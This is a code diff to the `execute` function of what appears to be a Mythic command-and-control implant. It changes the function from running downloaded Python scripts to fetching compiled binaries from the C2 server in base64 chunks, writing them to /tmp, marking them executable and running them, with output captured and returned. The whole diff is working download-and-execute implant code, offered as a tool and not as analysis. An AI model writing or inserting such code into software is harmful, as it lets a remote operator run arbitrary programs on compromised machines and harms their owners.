@@ -66,22 +66,24 @@ def execute(params, task_id, callback_id):
     total = len(file_ids)
     for i, file_id in enumerate(file_ids, start=1):
         is_last = (i == total)
-        tmp_path = f"/tmp/{uuid.uuid4().hex}.py"
+        tmp_path = f"/tmp/{uuid.uuid4().hex}"
         try:
-            # Fetch script from Mythic using chunked transfer
+            # Fetch compiled binary from Mythic using chunked transfer
             chunk_resp = _fetch_chunk(callback_id, task_id, file_id, 1)
             total_chunks = chunk_resp.get("total_chunks", 1)
-            script_data = base64.b64decode(chunk_resp.get("chunk_data", ""))
+            binary_data = base64.b64decode(chunk_resp.get("chunk_data", ""))
 
             for chunk_num in range(2, total_chunks + 1):
                 chunk_resp = _fetch_chunk(callback_id, task_id, file_id, chunk_num)
-                script_data += base64.b64decode(chunk_resp.get("chunk_data", ""))
+                binary_data += base64.b64decode(chunk_resp.get("chunk_data", ""))
 
+            # Write binary, make executable, run directly — no python3 needed
             with open(tmp_path, "wb") as fh:
-                fh.write(script_data)
+                fh.write(binary_data)
+            os.chmod(tmp_path, 0o755)
 
             result = subprocess.run(
-                ["python3", tmp_path],
+                [tmp_path],
                 capture_output=True, text=True, timeout=60
             )
             output = result.stdout + result.stderr
